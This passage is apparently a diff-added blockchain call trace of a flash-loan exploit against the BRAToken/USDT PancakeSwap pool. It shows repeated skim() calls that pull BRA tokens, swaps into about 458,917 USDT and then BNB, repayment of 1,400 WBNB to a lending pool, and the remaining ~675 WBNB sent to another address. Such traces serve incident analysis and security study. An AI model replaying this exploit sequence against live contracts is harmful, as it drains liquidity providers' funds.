+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 211143045069331582666718
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 202551903264541662448677) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][STATICCALL] from=0x1fae46, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 217219602167267832539918
+      [4][STATICCALL] from=0x1fae46, to=PancakeRouter, getAmountsOut(amountIn(uint256): 208628460362477912321877, path(address[]): ['0x449FEA37d339a11EfE1B181e5D5462464bBa37...) -> [208628460362477912321877, 458917996365062737064211]
+        [5][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['8591141804789920218041', '477863210521495817138589', '1673325640']
+      [4][CALL] from=0x1fae46, to=PancakePair, swap(amount0Out(uint256): 0, amount1Out(uint256): 458917996365062737064211, to(address): 0x1FAe46, data(bytes): b'') -> None
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x1FAe46, amount(uint256): 458917996365062737064211) -> True
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 217219602167267832539918
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 18945214156433080074378
+      [4][CALL] from=0x1fae46, to=BEP20USDT, approve(spender(address): 0x10ED43, amount(uint256): 10000000000000000000000000000) -> True
+      [4][STATICCALL] from=0x1fae46, to=BEP20USDT, balanceOf(account(address): 0x1FAe46) -> 458917996365062737064211
+      [4][CALL] from=0x1fae46, to=PancakeRouter, swapExactTokensForETH(amountIn(uint256): 458917996365062737064211, amountOutMin(uint256): 1, path(address[]): ['0x55d398326f99059fF775485246999027B31979..., to(address): 0x1FAe46, deadline(uint256): 111111111111111) -> [458917996365062737064211, 1675724517850647356854]
+        [5][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['63063352905858297002734193', '232526686200174894330517', '1673325640']
+        [5][CALL] from=PancakeRouter, to=BEP20USDT, transferFrom(sender(address): 0x1FAe46, recipient(address): 0x16b9a8, amount(uint256): 458917996365062737064211) -> True
+        [5][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 0, amount1Out(uint256): 1675724517850647356854, to(address): 0x10ED43, data(bytes): b'') -> None
+          [6][CALL] from=PancakePair, to=WBNB, transfer(dst(address): 0x10ED43, wad(uint256): 1675724517850647356854) -> True
+          [6][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x16b9a8) -> 63522270902223359739798404
+          [6][STATICCALL] from=PancakePair, to=WBNB, balanceOf((address): 0x16b9a8) -> 230850961682324246973663
+        [5][CALL] from=PancakeRouter, to=WBNB, withdraw(wad(uint256): 1675724517850647356854) -> None
+          [6][CALL][1675.7245178506473] from=WBNB, to=PancakeRouter
+        [5][CALL][1675.7245178506473] from=PancakeRouter, to=0x1fae46
+      [4][CALL] from=0x1fae46, to=WBNB, deposit() -> None
+      [4][CALL] from=0x1fae46, to=WBNB, transfer(dst(address): 0x0fe261, wad(uint256): 1400000000000000000000) -> True
+      [4][STATICCALL] from=0x1fae46, to=WBNB, balanceOf((address): 0x1FAe46) -> 675724517850647356854
+      [4][CALL] from=0x1fae46, to=WBNB, transfer(dst(address): 0x67a909, wad(uint256): 675724517850647356854) -> True
+    [3][STATICCALL] from=DPPAdvanced, to=WBNB, balanceOf((address): 0x0fe261) -> 1480580271602770106054
+    [3][STATICCALL] from=DPPAdvanced, to=BEP20Token, balanceOf(account(address): 0x0fe261) -> 301033061808005078179871
+    [3][STATICCALL] from=DPPAdvanced, to=WBNB, balanceOf((address): 0x0fe261) -> 1480580271602770106054
+    [3][STATICCALL] from=DPPAdvanced, to=BEP20Token, balanceOf(account(address): 0x0fe261) -> 301033061808005078179871
